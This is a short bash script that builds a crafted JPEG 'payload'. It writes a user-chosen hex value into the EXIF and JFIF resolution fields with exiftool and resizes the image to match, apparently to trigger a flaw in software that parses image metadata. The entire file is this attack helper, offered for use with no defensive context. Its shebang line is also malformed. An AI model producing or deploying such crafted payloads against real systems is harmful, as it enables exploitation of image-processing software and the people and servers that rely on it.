#/bin/bash
echo "========================================="
echo "Ensure you are running the script from"
echo "the same folder where you have your image"
echo "========================================="
echo " "
echo "Please enter filename"
read file
echo "Please enter hexvalue to insert"
read hex 
exiftool -Xresolution=$hex -Yresolution=$hex -jfif:Xresolution=$hex -jfif:Yresolution=$hex $file
convert $file -resize "$hex"x"$hex"\> lpayload.jpeg
rm $file"_original"
echo "Payload generated on same Working directory"
